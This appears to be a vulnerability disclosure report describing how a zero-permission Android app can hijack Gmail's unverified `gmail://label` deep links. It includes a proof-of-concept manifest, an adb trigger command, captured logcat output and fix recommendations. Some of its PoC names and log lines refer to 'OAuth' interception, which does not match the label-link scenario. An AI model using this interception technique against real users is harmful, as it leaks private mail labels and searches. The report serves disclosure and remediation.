# Gmail — Label Deep Link Interception via Unverified `gmail://label` Custom URI Scheme

## Summary

Gmail (`com.google.android.gm`) registers a BROWSABLE intent filter for the custom URI scheme `gmail://label` without App Link verification. A zero-permission attacker app can register a competing intent filter for the same scheme, causing Android to display a disambiguation chooser whenever a `gmail://label` deep link is invoked (e.g. label/category navigation or a saved-search shortcut). If the user selects the attacker app, the label path and any query parameters (including search queries such as `is:unread`) are captured.

## Severity: MEDIUM

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select the attacker app from the system chooser
- **CIA impact**: Confidentiality (mail label/category names and embedded search-query parameters leaked to a zero-permission attacker)

## Affected Components

- **Package**: `com.google.android.gm` (Gmail)
- **Activity**: `com.google.android.gm.browse.PublicLabelDeepLinkV2`
- **Scheme**: `gmail://label`

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="gmail" android:host="label" />
</intent-filter>
```

**No `android:autoVerify="true"` is present on this filter.** Gmail's verified App Links use `https://mail.google.com/...`; the `gmail://` custom scheme is unverified and freely claimable by any installed app.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="gmail" android:host="label" />
    </intent-filter>
</activity>
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Trigger a Gmail label deep link:
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d "gmail://label/Inbox?query=is%3Aunread"
   ```
3. Android displays a chooser/"Open with ZeroPerm" confirmation.
4. If the user selects/confirms ZeroPerm, the label path and query parameters are captured.

### Runtime Proof

Foreground activity confirms the system dialog is actually shown:

```
topResumedActivity=ActivityRecord{... android/com.android.internal.app.ResolverActivity ...}
```

logcat after confirming ZeroPerm:

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: gmail://label/Inbox?query=is%3Aunread
W OAUTH_INTERCEPT: [+] Param: query = is:unread
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

## Impact

### Confidentiality
- **Label/category exposure**: The specific Gmail label being navigated to (which can reflect user-created labels — e.g. personal, medical, financial, or legal categories) is exposed to a zero-permission attacker.
- **Search-query leakage**: Query parameters carried on the deep link (e.g. `is:unread`, or more specific saved searches) reveal the user's mail-organization habits.

### Integrity
- **Navigation hijack**: Selecting the attacker app prevents Gmail from opening the intended label view; the attacker can instead show a spoofed Gmail UI.

## Attack Scenario

1. A widget, notification action, or another Google app links to `gmail://label/<user-defined-label>?query=...` to jump directly to a specific label.
2. The attacker's zero-permission app is already installed on the device.
3. The chooser appears; if the user selects the attacker app, the label name and search parameters are captured.

## Recommended Fix

1. Migrate `gmail://label` to a verified `https://mail.google.com/...` App Link with `autoVerify="true"`.
2. Validate the caller with `Activity.getCallingPackage()` if the custom scheme must be retained.
3. Remove `BROWSABLE` from the filter if not intended for arbitrary external senders.

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.54)
- `screen_gmail_chooser.png` — Chooser showing ZeroPerm alongside Gmail
- `screen_gmail_data_capture.png` — ZeroPerm displaying captured `gmail://label` URI data
